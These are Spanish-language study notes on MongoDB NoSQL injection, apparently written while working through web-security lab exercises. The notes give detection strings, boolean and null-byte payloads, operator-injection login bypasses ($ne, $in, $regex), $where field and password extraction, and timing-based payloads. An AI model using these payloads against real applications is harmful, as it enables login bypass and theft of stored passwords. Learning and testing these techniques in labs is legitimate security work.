## Syntaxis injections

Buscamos romper la sintaxis provocando algún error o algún comportamiento inesperado, para ello meteremos carácteres especiales, si sabemos el lenguaje de las APIs que maneja podremos saber que caracteres meter.

### Detección

MongoDB:

Imaginemos que la web tiene esta url : 

```
https://insecure-website.com/product/lookup?category=fizzy
```

Esta petición haría que la web mande un JSON query para pillar productos de la base de datos que sean de la categoría indicada.

Por detrás haría : 
```
this.category == 'fizzy'
```

Strings que pueden romper la sintaxis de MongoDB pueden ser : 

```
'"`{
;$Foo}
$Foo \xYZ
```

Si los metemos todos en la url quedarían así : 

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
```

En este caso el payload es url encodeado porque está en una url, en caso de que la inyección sea en un JSON el payload sería algo así :

```
`'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```



### Explotación


#### Comportamientos condicionales

Vamos a ver si podemos hacer condiciones booleanas para que nos de respuestas diferentes, para ello usaremos payloads como estos:

`
```
' && 0 && 'x
' && 1 && 'x
```

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```


#### Sobrescribir  condiciones existentes

Podemos modificar las condiciones ya instauradas de forma muy similar con las inyecciones SQL:

```
'||'1'=='1
```

por detrás habremos inyectado esto:

```
this.category == 'fizzy'||'1'=='1'
```

En caso de que por detrás de nuestro input haya más código que restrinja nuestra inyección tendremos que comentar al final de nuestro input para que lo demás no se ejecute:

Código por detrás:

```
this.category == 'fizzy' && this.released == 1
```

payload:

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Inyección por detrás : 

```
this.category == 'fizzy'\u0000' && this.released == 1
```

Esto funciona en MongoDB porque `\u0000` respresenta un null character, y MongoDB ignora todo lo que hay por detrás de el.

#### Extract data

Los ejemplos serán con la sintaxis de MongoDB

`https://insecure-website.com/user/lookup?username=admin`

por detrás : 

`{"$where":"this.username == 'admin'"}`

##### Payloads

-primera letra de la contraseña:

`admin' && this.password[0] == 'a' || 'a'=='b`

-ver si la contraseña tiene digitos:

`admin' && this.password.match(/\d/) || 'a'=='b`

-Comprobar la existencia de un campo:

`admin' && this.username!='` -> existe 
`admin' && this.foo!='` -> no existe
	


## Operator inyection

NoSQL databases suelen usar query operators, estos no son más que formas de especificar condiciones que los datos tienen que usar para formar una query.

Por ejemplo MongoDB tiene estos : 

```
$where -> Muestra resultados que cumplan con una condición de JavaScript
$ne -> Devuelve todos los resultados que no son iguales a un valor específico
$in -> Devuelve todos los valores especificados de un array
$regex -> Devuelve valores que cumplan con una "regular expression"
```

Ejemplo en formato JSON : 

`{"username":"wiener"}` -> `{"username":{"$ne":"invalid"}}`

Ejemplo en formato URL:

`username=wiener` -> `username[$ne]=invalid`

Si esto último no funciona podremos intentar : 

1. Cambiar de GET a POST
2. Cambiar el content-type a `application/json`
3. Añade JSON al body
4. Haz la inyección en formato JSON

### Detección

SI tenemos : 

`{"username":"wiener","password":"peter"}`

Payload:

`{"username":{"$ne":"invalid"},"password":"peter"}`

o

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

Si nuestro objetivo es loggearnos como un usuario o usuarios en específico:

`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

#### LAB login bypass

```
{
"username":{
	"$regex":"admin.*"
},
"password":{
	"$ne":""
	}
}
```

### Extract data


Petición normal:

`{"username":"wiener","password":"peter"}`

payload diferencial:

`{"username":"wiener","password":"peter", "$where":"0"}`
`{"username":"wiener","password":"peter", "$where":"1"}`

Key() method to extract data fields:2222222

`"$where":"Object.keys(this)[1].match('^.{0}a.*')"`

El primer 1 representa el field 1
El segundo 0 representa la letra 0 del field
y la "a" es el caracter que comparamos

así que para encontrar el nombre del campo hay que fuzzear el último "0" y la "a"

Así consigues el nombre del campo, para ver el valor hay que fuzzear de igual forma esto : 

`"$where":"this.<nombre del field>.match('^.{§0§}§a§.*')"`

Regex para ver la primera letra de una contraseña:

`{"username":"admin","password":{"$regex":"^a*"}}`

## Timing based injection

`admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`

`admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
